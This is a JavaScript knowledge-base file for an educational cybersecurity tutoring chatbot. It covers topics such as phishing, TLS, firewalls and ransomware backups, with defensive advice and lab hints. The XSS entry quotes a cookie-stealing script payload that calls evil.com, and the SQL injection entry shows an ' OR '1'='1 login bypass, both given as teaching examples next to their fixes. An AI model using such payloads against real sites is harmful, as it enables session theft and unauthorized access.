// CyberZero — Cy-Bot Knowledge Base
// Fuzzy topic matching with 40+ topics across all 22 curriculum areas.

const CYBOT_KB = [
  {
    keywords: ["wifi","wi-fi","wireless","packet","intercept","http","airwave","eavesdrop"],
    title: "Wi-Fi Security & Packet Interception",
    response: "🔓 <b>Wi-Fi Interception 101:</b> On unencrypted HTTP, your data travels as plain readable text over radio waves. Anyone within ~100 meters with a Wi-Fi adapter and Wireshark can capture your passwords.\n\n<b>Lab Hint:</b> In Module 1, toggle the HTTPS shield ON. Watch how packet payloads transform from 'password=secret123' into '8F3AC09...AES256...' — meaningless to interceptors."
  },
  {
    keywords: ["dns","domain","resolve","lookup","nameserver","ip address","phonebook"],
    title: "DNS & Domain Resolution",
    response: "📖 <b>DNS — The Internet's Phonebook:</b> Every time you type a domain, your OS queries a DNS resolver → Root Server → TLD Server → Authoritative Server. The final answer is an IP address your browser drives to.\n\n<b>Attack Alert:</b> DNS Cache Poisoning injects fake IP answers into this chain, silently redirecting you to attacker servers. Always use DNS-over-HTTPS (DoH) to encrypt DNS queries."
  },
  {
    keywords: ["https","tls","ssl","certificate","padlock","handshake","encrypt transit"],
    title: "HTTPS & TLS Encryption",
    response: "🔒 <b>HTTPS & TLS:</b> The TLS handshake uses asymmetric cryptography (RSA/ECDHE) to negotiate a symmetric session key — then all actual data uses AES-256. This means nobody on the network can read your traffic, even if they capture every packet.\n\n<b>Check the Padlock:</b> Click the padlock icon in your browser → View Certificate → Verify the domain matches what you intended to visit."
  },
  {
    keywords: ["white hat","black hat","ethics","authorization","legal","pen test","permission","bug bounty"],
    title: "Cybersecurity Ethics & Authorization",
    response: "🤠 <b>White Hat = Written Permission:</b> The Computer Fraud and Abuse Act (CFAA) makes unauthorized computer access a federal crime regardless of intent. Written authorization from the system owner is your only legal defense.\n\n<b>Best Practice:</b> Professional penetration testers use formal Statements of Work, Rules of Engagement documents, and get-out-of-jail letters before touching any system."
  },
  {
    keywords: ["password","entropy","crack","brute force","dictionary","hashcat","strength","combination"],
    title: "Password Entropy & Cracking",
    response: "🗝️ <b>Real Password Math:</b> Entropy = log₂(charset_size ^ length). A random 16-char password from 95 printable ASCII characters = log₂(95^16) ≈ 105 bits of entropy.\n\n<b>GPU Reality:</b> A top-end GPU cluster running Hashcat cracks bcrypt hashes at ~100,000/second. For SHA-256: ~10 billion/second. A 105-bit entropy password = 2^105 / 10^10 seconds = longer than the age of the universe.\n\n<b>Action:</b> Use a password manager to generate and store 20+ character random strings."
  },
  {
    keywords: ["2fa","mfa","two factor","authenticator","totp","otp","one time","google authenticator"],
    title: "Two-Factor Authentication (2FA/TOTP)",
    response: "🛡️ <b>TOTP Mechanics:</b> Google Authenticator uses HMAC-SHA1(shared_secret + floor(unix_time/30)) to generate a 6-digit code valid for exactly 30 seconds. The secret is shared during QR code setup.\n\n<b>Why it works:</b> Even with your password, an attacker needs your physical phone. Without it, they cannot compute the current valid TOTP code.\n\n<b>Module 6 Hint:</b> Look at the rotating code in the lab. Type it exactly (including spaces removed) and click Verify."
  },
  {
    keywords: ["phishing","spear phishing","email scam","fake email","spoofing","impersonation","urgent"],
    title: "Phishing & Email Spoofing",
    response: "🎣 <b>Phishing Anatomy:</b> Check these 4 red flags: (1) Sender domain — PayPal sends from @paypal.com ONLY. (2) Urgency language — 'Act NOW or lose access!' (3) Vague greeting — 'Dear Customer' instead of your name. (4) Link destination — hover (don't click) to see where it actually leads.\n\n<b>Spear Phishing</b> is personalized — attackers research you on LinkedIn first, then craft targeted emails using your real name, company, and manager's name."
  },
  {
    keywords: ["smishing","sms","text message","vishing","phone call","redelivery","package fee"],
    title: "Smishing & Vishing (SMS/Phone Scams)",
    response: "📱 <b>Smishing Psychology:</b> SMS feels more urgent and personal than email. The tiny $1.99 fee is deliberate — small amounts bypass your financial suspicion. Once you enter card details for $1.99, attackers have your full card number, expiry, and CVV for unlimited charges.\n\n<b>Rule:</b> Legitimate carriers (USPS, FedEx, UPS) never request card payment via SMS link. Always navigate directly to their official website if you have package questions."
  },
  {
    keywords: ["trojan","malware","executable","download","free software","crack","warez","cheat"],
    title: "Trojan Horse Malware",
    response: "🐴 <b>Trojan Delivery Vectors:</b> Free software cracks, game cheats, fake Adobe downloads, 'free VPN' apps, and pirated media are the most common Trojan delivery mechanisms.\n\n<b>Defense:</b> Before running any executable: (1) Check digital signature publisher. (2) Upload to virustotal.com for 70+ antivirus engine scan. (3) Run in a sandbox (Cuckoo, Any.run) first. (4) Only download software from official publisher websites."
  },
  {
    keywords: ["keylogger","keyboard","hook","spy","input capture","hook api","typing"],
    title: "Keyloggers & Input Interception",
    response: "🛑 <b>How Keyloggers Work:</b> Software keyloggers use SetWindowsHookEx() to register a low-level keyboard hook in the Windows kernel. Every WM_KEYDOWN event gets forwarded to the logger before reaching your application.\n\n<b>Countermeasures:</b> (1) Virtual on-screen keyboard — mouse clicks bypass keyboard hooks. (2) Anti-keylogger software. (3) Hardware keyloggers (physical USB devices) require physical security — check keyboard USB ports."
  },
  {
    keywords: ["ransomware","backup","air gap","offline","encrypt files","restore","recovery","3-2-1"],
    title: "Ransomware & Air-Gapped Backups",
    response: "💾 <b>3-2-1 Backup Rule:</b> 3 copies of data, on 2 different media types, with 1 copy offsite/offline (air-gapped).\n\n<b>Ransomware Reality:</b> Modern ransomware like LockBit actively deletes VSS (Volume Shadow Copies) and searches for connected NAS/backup drives before encrypting. Only physically disconnected drives survive.\n\n<b>Module 11 Hint:</b> Click 'Detonate Ransomware' to see which drives get encrypted. Your air-gapped USB (unplugged) will be the only survivor."
  },
  {
    keywords: ["sandbox","dynamic analysis","behavior","cuckoo","any.run","isolate","virtual machine","detonation"],
    title: "Malware Sandboxing & Dynamic Analysis",
    response: "🧪 <b>Sandbox Analysis:</b> A sandbox creates a disposable virtual machine, executes the suspicious file, monitors all system calls, file writes, registry changes, and network connections — then destroys the VM.\n\n<b>What It Catches:</b> Polymorphic malware that changes its signature to evade antivirus. Process injection, rootkit installation, command-and-control (C2) callback URLs, and lateral movement attempts are all captured.\n\n<b>Public Sandboxes:</b> any.run, joesandbox.com, hybrid-analysis.com — free for community use."
  },
  {
    keywords: ["evil twin","rogue ap","access point","fake wifi","man in the middle","mitm","airport","coffee shop"],
    title: "Evil Twin Wi-Fi Attacks",
    response: "✈️ <b>Evil Twin Setup:</b> Attacker creates an access point with the same SSID as a legitimate network but with stronger signal. Your device auto-connects to the strongest signal. All traffic now routes through the attacker's laptop running Wireshark and Burp Suite.\n\n<b>Defense:</b> (1) Verify SSIDs with venue staff. (2) Never connect to Open (no-password) networks. (3) Use a VPN — even if connected to an evil twin, all your traffic is encrypted end-to-end."
  },
  {
    keywords: ["vpn","virtual private network","tunnel","wireguard","openvpn","privacy","public wifi"],
    title: "VPNs & Traffic Tunneling",
    response: "🚇 <b>How VPNs Work:</b> WireGuard (modern standard) creates an encrypted UDP tunnel using Curve25519 key exchange and ChaCha20-Poly1305 encryption. All your traffic routes through the VPN server before reaching its destination.\n\n<b>What VPNs Protect:</b> Local eavesdroppers on the same network. Your ISP's traffic logs. DNS query privacy (if using VPN's DNS).\n\n<b>What VPNs Don't Protect:</b> Account compromises. Malware on your device. The VPN provider itself (use reputable no-log providers)."
  },
  {
    keywords: ["firewall","port","iptables","rules","block","allow","nmap","scan","open port"],
    title: "Firewalls & Port Security",
    response: "🚪 <b>Firewall Fundamentals:</b> Stateful packet filtering tracks connection state (SYN, ESTABLISHED, RELATED) — not just port numbers. This prevents SYN flood attacks and blocks unsolicited inbound traffic even on 'open' ports.\n\n<b>Key Ports to Know:</b> 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL), 3389 (RDP — very high risk exposed to internet), 5432 (PostgreSQL).\n\n<b>Module 15 Hint:</b> Use nmap simulation to scan your server. Close all ports except 443. Verify with a second nmap scan that all others show 'filtered'."
  },
  {
    keywords: ["sql injection","sqli","database","query","where clause","union","owasp","prepared statement"],
    title: "SQL Injection",
    response: "🧹 <b>SQL Injection Explained:</b> If your login query is: `SELECT * FROM users WHERE username='${input}'` and I input `' OR '1'='1`, the query becomes: `WHERE username='' OR '1'='1'` — always true, bypassing all authentication.\n\n<b>Fix:</b> Parameterized queries (prepared statements) separate SQL structure from data: `SELECT * FROM users WHERE username=?` — then bind your input as a parameter. The database engine never interprets user input as SQL syntax."
  },
  {
    keywords: ["xss","cross site scripting","script tag","cookie theft","dom","stored xss","reflected","csp"],
    title: "Cross-Site Scripting (XSS)",
    response: "📝 <b>XSS Attack Mechanics:</b> Stored XSS: Attacker posts <script>fetch('evil.com/steal?c='+document.cookie)</script> in a comment. Every user who loads the comment page executes the script and sends their session cookie to the attacker.\n\n<b>Defenses:</b> (1) HTML encode all output (convert < to &lt;). (2) Content Security Policy (CSP) header blocks inline scripts. (3) HttpOnly cookie flag prevents JavaScript cookie access entirely.\n\n<b>Module 17 Hint:</b> Enable HTML encoding to see the script tag become &lt;script&gt; — displayed as text, never executed."
  },
  {
    keywords: ["hash","sha256","sha","md5","bcrypt","argon2","integrity","fingerprint","one way"],
    title: "Cryptographic Hashing",
    response: "💍 <b>Hash vs Encryption:</b> Encryption is two-way (encrypt → decrypt with key). Hashing is one-way (hash → no return). SHA-256 always produces exactly 256 bits regardless of input size.\n\n<b>Password Storage:</b> Never store passwords — store bcrypt(password + salt). bcrypt is intentionally slow (configurable iterations) to make GPU cracking prohibitively expensive.\n\n<b>MD5 and SHA-1 are broken</b> — don't use for security. SHA-256 or SHA-3 minimum. Argon2 for password hashing."
  },
  {
    keywords: ["ddos","dos","denial of service","botnet","flood","traffic","rate limit","cloudflare","cdn"],
    title: "DDoS Attacks & Defenses",
    response: "🚦 <b>DDoS Types:</b> Volumetric (bandwidth flood, 1+ Tbps), Protocol (SYN floods exhausting server state), Application Layer (L7 HTTP floods targeting specific endpoints).\n\n<b>Defense Stack:</b> CDN edge (absorbs volumetric) → Rate limiting (throttles bots per IP) → CAPTCHA challenges (separates humans from bots) → Auto-scaling origin (handles legitimate load spikes).\n\n<b>Module 19 Hint:</b> Drag the rate limiter slider below 50 req/s and watch the server health meter turn green."
  },
  {
    keywords: ["zero day","cve","cvss","patch","vulnerability","exploit","disclosure","responsible"],
    title: "Zero-Day Vulnerabilities & Patch Management",
    response: "⚡ <b>CVE Triage Priority:</b> CVSS Score 9.0-10.0 (Critical) with known public exploit = patch within 24 hours or implement compensating controls immediately.\n\n<b>Patch Management SLA:</b> Critical: 24-72 hours | High: 7 days | Medium: 30 days | Low: 90 days.\n\n<b>Module 20 Hint:</b> Check the CVSS score on each alert. Any score above 9.0 with a known exploit gets emergency patched — click 'Deploy Emergency Patch' before the timer expires."
  },
  {
    keywords: ["forensics","dfir","log","incident response","timeline","artifacts","evidence","breach","investigation"],
    title: "Digital Forensics & Incident Response",
    response: "🔍 <b>DFIR Process:</b> Identify (detect anomaly) → Contain (isolate affected systems) → Eradicate (remove threat) → Recover (restore from clean backups) → Lessons Learned.\n\n<b>Key Log Sources:</b> Windows Event Log (4625=failed login, 4624=success), /var/log/auth.log (Linux), Firewall logs (connection attempts), Application logs (error spikes).\n\n<b>Module 21 Hint:</b> Filter logs to the 03:00-04:00 AM window. Look for the IP with 50 failed logins followed immediately by a success — that's your brute-force success event."
  },
  {
    keywords: ["defense in depth","zero trust","architecture","layered","microsegmentation","nist","framework","siem"],
    title: "Defense in Depth & Zero Trust",
    response: "👑 <b>Defense in Depth Layers:</b> Perimeter → Network → Identity → Application → Data → Endpoint → Monitoring. Each layer independently protects so a failure in one doesn't cascade.\n\n<b>Zero Trust Principle:</b> 'Never trust, always verify.' Every access request is authenticated, authorized, and encrypted — regardless of network location. No implicit trust for internal network users.\n\n<b>Module 22 Hint:</b> Click all 4 security layer buttons. Each layer adds to your castle's defense score. All 4 active = impenetrable citadel."
  },
  {
    keywords: ["stuck","help","don't understand","what do i do","confused","lost","how to","guide me"],
    title: "I Need Guidance",
    response: "🤖 <b>Cy-Bot Guidance Protocol Activated!</b>\n\nHere's how to navigate the platform:\n• <b>Module View:</b> Read the 'Concept' tab first (the plain-English analogy). Then go to 'Lab' and interact with the simulation. Finally, take the 'Quiz' — you get 3 lives.\n• <b>Lab Stuck?</b> Every lab has a step-by-step hint in the pillar title area.\n• <b>Quiz Stuck?</b> Wrong answers show a full explanation of why each option is correct or wrong.\n• <b>Terminal Stuck?</b> Type 'help' in the terminal for all available commands.\n• <b>Ask me specifically:</b> 'How does SQL injection work?' or 'What is a VPN?' and I'll give you a focused explanation!"
  },
  {
    keywords: ["wrong answer","quiz fail","incorrect","don't know the answer","what's the answer"],
    title: "Quiz Help",
    response: "🎯 <b>Quiz Strategy:</b> Don't guess randomly — every wrong answer costs 1 life (you get 3 per module). After each wrong answer, read the full explanation panel — it tells you exactly WHY each option was correct or incorrect.\n\n<b>Study First:</b> Go back to the 'Concept' tab and re-read the analogy. The correct quiz answer always directly relates to the analogy concept.\n\n<b>Cy-Bot Shortcut:</b> Ask me 'explain [topic from the module]' and I'll give you a targeted explanation before you re-attempt the quiz!"
  },
  {
    keywords: ["xp","level","rank","badge","trophy","progress","score","points"],
    title: "XP, Levels & Badges",
    response: "🏆 <b>XP System:</b> Base quiz XP = 30 + (combo_streak × 5). Boss battles award +200 XP. Arcade games award +20-100 XP per game.\n\n<b>Ranks:</b> Cyber Cadet (0 XP) → Vigilant Defender (800+) → Senior Scout (2000+) → Elite Operative (5000+) → Grandmaster Sentinel (all 22 badges + 4 bosses).\n\n<b>Combo Streaks:</b> Answer multiple quizzes correctly in a row to multiply your XP. Breaking the streak (wrong answer) resets it to 0."
  },
  {
    keywords: ["social engineering","manipulation","pretexting","baiting","tailgating","human factor"],
    title: "Social Engineering",
    response: "🎭 <b>Social Engineering:</b> 95% of successful cyberattacks involve a human element. Key techniques:\n\n• <b>Pretexting:</b> Creating a fake scenario ('I'm from IT, we need your password to fix your account')\n• <b>Baiting:</b> Leaving infected USB drives in parking lots — curiosity gets employees to plug them in\n• <b>Tailgating:</b> Following an authorized person through a secure door\n• <b>Vishing:</b> Phone calls impersonating banks, IRS, or tech support\n\n<b>Defense:</b> Verify identity through a second independent channel before any action."
  },
  {
    keywords: ["owasp","top 10","web application","api security","injection","broken auth","security misconfiguration"],
    title: "OWASP Top 10",
    response: "🌐 <b>OWASP Top 10 Web Vulnerabilities (2021):</b>\n1. Broken Access Control\n2. Cryptographic Failures\n3. Injection (SQL, XSS)\n4. Insecure Design\n5. Security Misconfiguration\n6. Vulnerable Components\n7. Auth Failures\n8. Data Integrity Failures\n9. Logging Failures\n10. SSRF\n\nModules 16, 17, and 18 cover items 2, 3, and 7 in depth."
  },
  {
    keywords: ["encryption","aes","rsa","asymmetric","symmetric","key","cipher","cryptography"],
    title: "Encryption Fundamentals",
    response: "🔐 <b>Symmetric vs Asymmetric:</b>\n\n<b>Symmetric (AES-256):</b> Same key encrypts and decrypts. Fast, used for bulk data. Challenge: how to securely share the key?\n\n<b>Asymmetric (RSA, ECDSA):</b> Public key encrypts, private key decrypts. Solves key distribution. But slow — only used for key exchange.\n\n<b>Real World:</b> TLS uses asymmetric crypto to securely exchange a symmetric session key, then switches to AES for all actual data (best of both worlds)."
  }
];

// Fuzzy topic matcher — returns best matching KB entry
function matchCybotTopic(query) {
  const lower = query.toLowerCase();
  let bestMatch = null;
  let bestScore = 0;
  
  for (const entry of CYBOT_KB) {
    let score = 0;
    for (const keyword of entry.keywords) {
      if (lower.includes(keyword)) {
        score += keyword.length; // longer keyword matches score higher
      }
    }
    if (score > bestScore) {
      bestScore = score;
      bestMatch = entry;
    }
  }
  
  return bestScore > 0 ? bestMatch : null;
}

// Get contextual help for the currently active module
function getCybotModuleHelp(moduleId) {
  if (!moduleId || moduleId < 1 || moduleId > 22) {
    return {
      title: "Module Help",
      response: "Select any module from the Training Modules view, then click the 🤖 Cy-Bot button inside the lab for context-specific guidance!"
    };
  }
  const mod = CURRICULUM.find(m => m.id === moduleId);
  if (!mod) return null;
  return {
    title: `Module #${mod.id}: ${mod.name}`,
    response: `📍 <b>You are working on:</b> ${mod.name} (${mod.difficulty})\n\n<b>Concept Reminder:</b> ${mod.analogy}\n\n💡 <b>Lab Hint:</b> ${mod.hint}\n\n<b>Real-World Context:</b> ${mod.incident}`
  };
}
